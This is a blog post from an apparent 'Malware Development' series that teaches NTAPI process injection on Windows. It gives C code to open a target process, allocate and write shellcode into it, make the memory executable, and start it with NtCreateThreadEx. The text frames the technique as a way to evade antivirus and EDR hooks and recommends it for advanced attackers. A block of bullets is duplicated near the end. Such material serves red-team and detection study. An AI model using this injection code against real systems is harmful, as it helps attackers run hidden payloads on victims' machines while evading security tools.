---
layout: post
title: "Malware Development Part 3: NTAPI Injection"
date: 2025-08-26
categories: [Malware Development,Red Team,NTAPI,C Programming]
image: https://cdn-images-1.medium.com/v2/resize:fit:800/1*jRbFFS4HqKPeyX2b1t4TNg.png
---



In this post, we’ll continue our malware development series with an exploration of **NTAPI Injection**, a stealthier and more advanced process injection technique. By using Native API calls (`Nt*` functions), malware can bypass traditional API hooks implemented by endpoint protection tools, evading detection more effectively.

We’ll dissect the provided code, explain the concepts step by step, and analyze how and why these techniques work.

- - -

### What is NTAPI Injection?

NTAPI Injection involves directly interacting with the Windows Native API (Nt\* functions) provided by **ntdll.dll**. These functions are lower-level and bypass Windows API hooks commonly used by security tools to monitor process interactions. This makes NTAPI Injection a preferred technique for stealthier operations in malware development.

### What is NTAPI?

**NTAPI (Native API)** refers to a low-level interface provided by `**ntdll.dll**`, which acts as a bridge between user-mode applications and the Windows kernel. Unlike the high-level Windows API, the Native API operates closer to the kernel, allowing for direct interaction with core system functions.

#### Purpose of NTAPI

*   Provides functions to interact with kernel objects, memory management, process/thread creation, file operations, etc.
*   Acts as the interface for many core OS operations, which higher-level APIs often build upon.
*   Useful for system-level tasks requiring fine control and high performance.

- - -

### NTAPI vs. Windows API

*   **Abstraction Level:**

**NTAPI (Native API) :** Low-level: interacts directly with the Windows kernel.

**Windows API:** High-level: built on top of NTAPI.

*   **Documentation:**

**NTAPI (Native API) :** Limited, partially documented, often reverse-engineered.

**Windows API:** Fully documented by Microsoft.

*   **Stability**

**NTAPI (Native API) :** Prone to changes between Windows versions.

**Windows API:** Stable and backward-compatible across versions.

*   **Use Case**

**NTAPI (Native API) :** Advanced operations like malware development, custom tools, and system exploration.

**Windows API:** General-purpose application development.

*   **Ease of Use**

**NTAPI (Native API) :** Requires understanding of system internals and reverse engineering.

**Windows API:** Easy to use with official libraries and guides.

*   **Detection by Security Tools**

**NTAPI (Native API) :** Less monitored, providing stealth for attackers.

**Windows API:** Actively monitored by most security solutions.

*   **Performance**

**NTAPI (Native API) :** Direct access to kernel functions for better performance.

**Windows API:** Abstracted for simplicity, which can add overhead.

*   **Example Functions**

**NTAPI (Native API) :** NtAllocateVirtualMemory, NtCreateThreadEx.

**Windows API:** VirtualAlloc, CreateThread.

NTAPI functions are less likely to trigger monitoring tools, making them attractive for stealthy operations such as advanced malware or rootkits.

- - -

### How to Discover NTAPI Functions

Most NTAPI functions are not officially documented by Microsoft, making them challenging to study. However, you can uncover and utilize these functions through various resources:

#### 1\. NTDOC Website

The **NTDOC website** is a comprehensive resource that reverse-engineers and documents NTAPI functions. It provides:

*   Function prototypes.
*   Expected arguments.
*   Example usage.

This is invaluable for researchers exploring undocumented features of Windows.

#### 2\. Reverse Engineering

Tools like IDA Pro or Ghidra can disassemble `ntdll.dll` to reveal the Native API function names and their internals. Reverse engineering is often used by security researchers and malware developers.

#### 3\. Research Articles and Forums

*   Security blogs, GitHub repositories, and forums like Stack Overflow often share details on NTAPI usage. [https://www.vergiliusproject.com/kernels](https://www.vergiliusproject.com/kernels)
*   Books such as **_Windows Internals_** by Mark Russinovich provide deep insights into NTAPI and its architecture.

- - -

### Why Use NTAPI in Malware?

1.  **Bypassing Detection**: Most AV/EDR solutions monitor high-level Windows APIs, not NTAPI calls.
2.  **Precision**: Provides fine-grained control over system operations.
3.  **Mimicking Legitimate Behavior**: Native API functions closely resemble legitimate OS operations, making it harder for security solutions to distinguish malicious activity.

### Differences Between NTAPI Injection, Shellcode Injection, and DLL Injection

The main distinction between NTAPI Injection and other code injection techniques, such as Shellcode Injection and DLL Injection, lies in the mechanisms, levels of stealth, and use cases. Here’s an in-depth comparison:

- - -

#### 1\. Shellcode Injection

*   **Mechanism**:
*   In Shellcode Injection, a payload (machine code or shellcode) is injected into the memory of a target process. Functions like `VirtualAllocEx`, `WriteProcessMemory`, and `CreateRemoteThread` from the Windows API are typically used.
*   **Stealth**:
*   Low stealth compared to NTAPI Injection because:
*   High-level Windows API calls (`WriteProcessMemory`, `CreateRemoteThread`) are commonly monitored by antivirus (AV) and endpoint detection and response (EDR) solutions.
*   These APIs are often hooked, allowing detection mechanisms to intercept and analyze their usage.
*   **Advantages**:
*   Relatively straightforward to implement.
*   Can inject complex, modular payloads like reverse shells.
*   **Disadvantages**:
*   Prone to detection due to the reliance on well-known Windows API functions.
*   Security tools can flag behaviors like memory allocation followed by execution.

- - -

#### 2\. DLL Injection

*   **Mechanism**:
*   Injects a dynamic-link library (DLL) into the memory space of a target process.
*   Typically achieved using Windows API functions like `CreateRemoteThread` or `QueueUserAPC` to load the DLL using `LoadLibrary`.
*   **Stealth**:
*   Moderate stealth. While DLL Injection avoids directly writing executable code into the process memory, the creation of a thread to load the DLL can still be detected.
*   DLLs can be signed or obfuscated to evade detection, but some AV/EDR solutions check loaded DLLs for suspicious behavior.
*   **Advantages**:
*   Easier to work with compared to raw shellcode, as DLLs support higher-level programming.
*   Versatile; DLLs can perform complex tasks and maintain state over time.
*   **Disadvantages**:
*   Creates visible artifacts in the target process (e.g., loaded DLLs in memory).
*   Requires a file on disk unless using reflective DLL injection, which is more advanced but adds complexity.

- - -

#### 3\. NTAPI Injection

*   **Mechanism**:
*   Leverages low-level Native API (NTAPI) functions, such as `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, and `NtCreateThreadEx`, to directly allocate memory, write a payload, and execute it within a remote process.
*   The Native API resides in `ntdll.dll` and interfaces directly with the kernel.
*   **Stealth**:
*   **High stealth**, primarily because:
*   It bypasses higher-level Windows API functions that are commonly hooked or monitored.
*   The use of NTAPI calls mimics legitimate system behavior more closely than conventional methods.
*   Security solutions rarely monitor NTAPI calls directly as they are lower-level functions.
*   **Advantages**:
*   Minimal detection surface. NTAPI calls are harder for AV/EDR solutions to intercept or flag as malicious.
*   Operates at a lower level, providing more control over memory and thread creation.
*   Compatible across different versions of Windows since the Native API is a core part of the OS.
*   **Disadvantages**:
*   Complex to implement and debug.
*   Requires in-depth knowledge of NTAPI functions and their arguments.

- - -

### What Makes NTAPI Injection Unique?

1.  **Direct Access to Kernel-Level Features**: NTAPI functions are low-level system calls used by the Windows subsystem to interact with the kernel. By using these directly, the injection process skips conventional APIs that security tools often monitor.
2.  **Stealth**: Many antivirus and EDR (Endpoint Detection and Response) solutions focus on high-level APIs. NTAPI injection bypasses these, reducing the chances of detection.
3.  **Control and Flexibility**: The developer has more granular control over memory allocation, thread creation, and execution compared to using traditional APIs.

- - -

### Understanding the Supporting Header File

The `ntfinal.h` file sets the stage for NTAPI Injection by defining key structures, macros, and function prototypes required to interact with Native API functions. Let’s break it down step by step.

- - -

### 1\. Macro Definitions

#define STATUS\_SUCCESS ((NTSTATUS)0x00000000L)

*   `**STATUS_SUCCESS**`: A common macro used to check if an NTAPI function executed successfully. Functions typically return an `NTSTATUS` value, and this macro indicates a successful operation.

- - -

### 2\. Structures for NTAPI Function Arguments

#### ClientId

typedef struct \_CLIENT\_ID {  
    VOID\* UniqueProcess; // Process ID  
    VOID\* UniqueThread;  // Thread ID  
} ClientId, \*PCLIENT\_ID;

*   `**ClientId**`: Used to identify the process and thread IDs when opening a handle to a process.
*   `**UniqueProcess**`: Points to the process ID.
*   `**UniqueThread**`: Points to the thread ID (optional in this context).

#### ObjectAttributes

typedef struct \_OBJECT\_ATTRIBUTES {  
    ULONG Length;                  // Size of the structure  
    VOID\* RootDirectory;           // Handle to a root directory (optional)  
    struct \_UNICODE\_STRING\* ObjectName; // Name of the object (optional)  
    ULONG Attributes;              // Object attributes  
    VOID\* SecurityDescriptor;      // Security descriptor (optional)  
    VOID\* SecurityQualityOfService; // Quality of service (optional)  
} ObjectAttributes, \*POBJECT\_ATTRIBUTES;

*   **Purpose**: Represents metadata about an object (like a process or memory).
*   Commonly passed as a parameter when working with NTAPI functions to define the attributes of the object being accessed.

#### PS\_ATTRIBUTE and PS\_ATTRIBUTE\_LIST

typedef struct \_PS\_ATTRIBUTE {  
    ULONG\_PTR Attribute; // Attribute type  
    SIZE\_T Size;         // Size of the attribute value  
    union {  
        ULONG\_PTR Value; // Direct value  
        PVOID ValuePtr;  // Pointer to the value  
    };  
    PSIZE\_T ReturnLength; // Length of the attribute data returned  
} PS\_ATTRIBUTE, \*PPS\_ATTRIBUTE;

typedef struct \_PS\_ATTRIBUTE\_LIST {  
    SIZE\_T TotalLength;   // Total size of the attribute list  
    PS\_ATTRIBUTE Attributes\[1\]; // Array of attributes  
} PS\_ATTRIBUTE\_LIST, \*PPS\_ATTRIBUTE\_LIST;

*   **Purpose**: Used in advanced scenarios like process/thread creation. These structures allow specifying attributes for the new process or thread.

- - -

### 3\. NTAPI Function Prototypes

The header defines several function pointers corresponding to NTAPI functions. These pointers are resolved dynamically at runtime using `GetProcAddress` on `ntdll.dll`.

#### Examples:

1.  **Opening a Process**

typedef NTSTATUS(NTAPI\* NtOpenProcess)(  
    OUT PHANDLE ProcessHandle,  
    IN ACCESS\_MASK DesiredAccess,  
    IN POBJECT\_ATTRIBUTES ObjectAttributes,  
    IN PCLIENT\_ID ClientId OPTIONAL  
);

*   Opens a handle to a process.
*   `**ProcessHandle**`: Receives the handle.
*   `**DesiredAccess**`: Specifies the access level (e.g., `PROCESS_ALL_ACCESS`).
*   `**ObjectAttributes**`: Describes the process attributes.
*   `**ClientId**`: Specifies the target process ID.

**2\. Allocating Memory**

typedef NTSTATUS(NTAPI\* NtAllocateVirtualMemory)(  
    IN HANDLE ProcessHandle,  
    IN OUT PVOID\* BaseAddress,  
    IN ULONG ZeroBits,  
    IN OUT PSIZE\_T RegionSize,  
    IN ULONG AllocationType,  
    IN ULONG Protect  
);

*   Allocates memory in a target process.
*   `**ProcessHandle**`: Handle to the process.
*   `**BaseAddress**`: Address of the allocated memory (output).
*   `**RegionSize**`: Size of the allocation.
*   `**AllocationType**`: Flags like `MEM_COMMIT`.
*   `**Protect**`: Memory protection, e.g., `PAGE_READWRITE`.

**3\. Writing to Memory**

typedef NTSTATUS(NTAPI\* NtWriteVirtualMemory)(  
    IN HANDLE ProcessHandle,  
    IN PVOID BaseAddress,  
    IN PVOID Buffer,  
    IN SIZE\_T NumberOfBytesToWrite,  
    OUT PSIZE\_T NumberOfBytesWritten OPTIONAL  
);

*   Writes data to the target process’s memory.

**4\. Creating a Thread**

typedef NTSTATUS(NTAPI\* NtCreateThreadEx)(  
    OUT PHANDLE ThreadHandle,  
    IN ACCESS\_MASK DesiredAccess,  
    IN POBJECT\_ATTRIBUTES ObjectAttributes OPTIONAL,  
    IN HANDLE ProcessHandle,  
    IN PVOID StartRoutine,  
    IN PVOID Argument OPTIONAL,  
    IN ULONG CreateFlags,  
    IN SIZE\_T ZeroBits,  
    IN SIZE\_T StackSize,  
    IN SIZE\_T MaximumStackSize,  
    IN PPS\_ATTRIBUTE\_LIST AttributeList OPTIONAL  
);

*   Creates a remote thread in the target process.
*   `**StartRoutine**`: Address of the entry point (e.g., shellcode).
*   `**ProcessHandle**`: Target process handle.

**5\. Freeing Memory**

typedef NTSTATUS(NTAPI\* NtFreeVirtualMemory)(  
    \_In\_ HANDLE ProcessHandle,  
    \_Inout\_ PVOID\* BaseAddress,  
    \_Inout\_ PSIZE\_T RegionSize,  
    \_In\_ ULONG FreeType  
);

*   Releases allocated memory in the target process.

**6\. Waiting for a Thread**

typedef NTSTATUS(NTAPI\* NtWaitForSingleObject)(  
    \_In\_ HANDLE Handle,  
    \_In\_ BOOLEAN Alertable,  
    \_In\_opt\_ PLARGE\_INTEGER Timeout  
);

*   Waits for an object (e.g., a thread) to complete.

By defining these NTAPI functions and structures, the `ntfinal.h` file allows seamless interaction with lower-level Windows mechanisms. This abstraction makes it possible to execute advanced malware techniques like NTAPI Injection.

- - -

### Step-by-Step Breakdown of Key NTAPI Functions:

#### 1\. Setting Up the Environment

#include "ntfinal.h"  
#pragma section(".text")  
\_\_declspec(allocate(".text")) CONST UCHAR shell\[\]

*   **ntfinal.h**: This header file contains function prototypes for the NTAPI functions used in the program (`NtOpenProcess`, `NtAllocateVirtualMemory`, etc.).
*   `**#pragma section(".text")**`: Defines a custom memory section. This is often used in malware to hide code or control how sections are allocated.
*   By placing the shellcode in the .**text** section:
*   The shellcode was loaded with execute permissions directly.
*   The operating system treated it as code, simplifying execution without additional memory protection changes.

- - -

#### 2\. Fetching Module Handles

HMODULE GetMod(IN LPCWSTR mod) {  
    HMODULE hmod = NULL;  
    hmod = GetModuleHandleW(mod);  
    if (hmod == NULL) {  
        printf("\[-\] Couldn't get a handle, error:%ld \\n", GetLastError());  
        return NULL;  
    }  
    return hmod;  
}

*   **Purpose**: Retrieves the handle for the specified module in memory (e.g., `ntdll.dll`).
*   `**GetModuleHandleW**`:
*   **Argument**: `mod` is the name of the module.
*   **Returns**: A handle to the module, or `NULL` if it’s not loaded.
*   This function is essential because we need the `ntdll.dll` handle to resolve NTAPI functions.

- - -

#### 3\. Target Process Identification

ClientId CID = { (HANDLE)PID, NULL };  
ObjectAttributes OA = { sizeof(OA), NULL };

*   **ClientId**: Specifies the target process and thread IDs (PID, TID).
*   **Argument**: `(HANDLE)PID` is the target process ID.
*   **ObjectAttributes**: Contains metadata about the handle being created.

- - -

#### 4\. Resolving NTAPI Functions

NtOpenProcess opent \= (NtOpenProcess)GetProcAddress(hNTDLL, "NtOpenProcess");

*   `**GetProcAddress**`:
*   **Purpose**: Dynamically retrieves the address of `NtOpenProcess` from `ntdll.dll`.
*   **Arguments**:
*   `hNTDLL`: Handle to `ntdll.dll`.
*   `"NtOpenProcess"`: Name of the NTAPI function.
*   **Returns**: A function pointer to the NTAPI function.

- - -

#### 5\. Opening a Handle to the Target Process

STATUS = opent(&hProcess, PROCESS\_ALL\_ACCESS, &OA, &CID);

*   `**NtOpenProcess**`:
*   **Arguments**:

1.  `&hProcess`: Pointer to the process handle.
2.  `PROCESS_ALL_ACCESS`: Grants full access to the target process.
3.  `&OA`: Object attributes.
4.  `&CID`: Client ID specifying the process to open.

*   **Purpose**: Obtains a handle to the target process for memory operations.

- - -

#### 6\. Allocating Memory in the Target Process

STATUS = ntalloc(hProcess, &rbuffer, 0, &shell\_size, MEM\_COMMIT | MEM\_RESERVE, PAGE\_READWRITE);

*   `**NtAllocateVirtualMemory**`:
*   **Arguments**:

1.  `hProcess`: Handle to the target process.
2.  `&rbuffer`: Pointer to the base address of the allocated memory.
3.  `0`: Zero-bias address.
4.  `&shell_size`: Size of the memory region.
5.  `MEM_COMMIT | MEM_RESERVE`: Memory allocation flags.
6.  `PAGE_READWRITE`: Memory protection.

*   **Purpose**: Allocates memory in the target process to store the shellcode.

- - -

#### 7\. Writing Shellcode into the Allocated Memory

STATUS = ntwrite(hProcess, rbuffer, shell, shell\_size, &BytesWritten);

*   `**NtWriteVirtualMemory**`:
*   **Arguments**:

1.  `hProcess`: Handle to the target process.
2.  `rbuffer`: Address of the memory region in the target process.
3.  `shell`: Pointer to the shellcode in the current process.
4.  `shell_size`: Size of the shellcode.
5.  `&BytesWritten`: Receives the number of bytes written.

*   **Purpose**: Copies the shellcode into the allocated memory of the target process.

- - -

#### 8\. Changing Memory Protection

STATUS = ntprotect(hProcess, &rbuffer, &shell\_size, PAGE\_EXECUTE\_READ, &oldProtection);

*   `**NtProtectVirtualMemory**`:
*   **Arguments**:

1.  `hProcess`: Handle to the target process.
2.  `&rbuffer`: Pointer to the memory region.
3.  `&shell_size`: Size of the region.
4.  `PAGE_EXECUTE_READ`: New protection level.
5.  `&oldProtection`: Receives the previous protection level.

*   **Purpose**: Enables the execution of the shellcode by changing the memory protection.

- - -

#### 9\. Creating a Remote Thread

STATUS = thread(&hThread, THREAD\_ALL\_ACCESS, &OA, hProcess, rbuffer, NULL, FALSE, 0, 0, 0, NULL);

*   `**NtCreateThreadEx**`:
*   **Arguments**:

1.  `&hThread`: Pointer to the thread handle.
2.  `THREAD_ALL_ACCESS`: Access rights for the new thread.
3.  `&OA`: Object attributes.
4.  `hProcess`: Handle to the target process.
5.  `rbuffer`: Address of the shellcode in the target process.
6.  `NULL`: Argument to the shellcode.
7.  `FALSE`: Thread creation flags.
8.  Remaining arguments are thread-related flags (set to 0 here).

*   **Purpose**: Creates a new thread in the target process, starting execution at the shellcode’s address.

- - -

![](https://cdn-images-1.medium.com/max/800/1*LZinikqdWZ5cEqBhnBCcpw.png)

### Full Code Repository

You can find the full code and examples discussed in this article on my **GitHub repository**:

[**GitHub - Moataz51201/NTAPI-Injection: This project demonstrates the NTAPI Injection technique,**  
_This project demonstrates the NTAPI Injection technique, - Moataz51201/NTAPI-Injection_github.com](https://github.com/Moataz51201/NTAPI-Injection.git "https://github.com/Moataz51201/NTAPI-Injection.git")[](https://github.com/Moataz51201/NTAPI-Injection.git)

**Stay tuned for the next episode.**

*   Security solutions rarely monitor NTAPI calls directly as they are lower-level functions.
*   **Advantages**:
*   Minimal detection surface. NTAPI calls are harder for AV/EDR solutions to intercept or flag as malicious.
*   Operates at a lower level, providing more control over memory and thread creation.
*   Compatible across different versions of Windows since the Native API is a core part of the OS.
*   **Disadvantages**:
*   Complex to implement and debug.
*   Requires in-depth knowledge of NTAPI functions and their arguments.

**Why NTAPI Injection Is Better**

1.  **Bypasses Security Hooks**:

*   Most security tools hook high-level APIs (e.g., WriteProcessMemory, VirtualAllocEx) rather than NTAPI functions. NTAPI Injection avoids detection by sidestepping these hooks.

1.  **Resembles Legitimate System Behavior**:

*   Since NTAPI functions are used by the OS itself for core functionalities, malicious NTAPI calls can blend in with normal system activity.

1.  **Increased Stealth**:

*   The use of NTAPI minimizes detection footprints, making it harder for security solutions to differentiate between legitimate and malicious usage.

1.  **Low Dependency on External Artifacts**:

*   Unlike DLL Injection, NTAPI Injection does not require a file on disk, reducing forensic traces.

**Use Cases**

*   **Shellcode Injection**: Quick payload delivery in scenarios where detection evasion isn’t a priority.
*   **DLL Injection**: Suitable for deploying modular malware requiring complex functionality or persistence.
*   **NTAPI Injection**: Ideal for advanced threat actors prioritizing stealth in high-security environments.

**Conclusion**

NTAPI Injection represents a significant leap in stealth and sophistication, offering advantages over traditional techniques like Shellcode and DLL Injection. While it demands more effort and expertise to implement, its ability to bypass traditional detection mechanisms makes it a preferred choice for advanced persistent threats (APTs) and other sophisticated attackers.

By [Moataz Osama](https://medium.com/@mezo512) on [November 25, 2024](https://medium.com/p/b40b133d3964).

[Canonical link](https://medium.com/@mezo512/malware-development-part-3-ntapi-injection-b40b133d3964)

Exported from [Medium](https://medium.com) on August 26, 2025.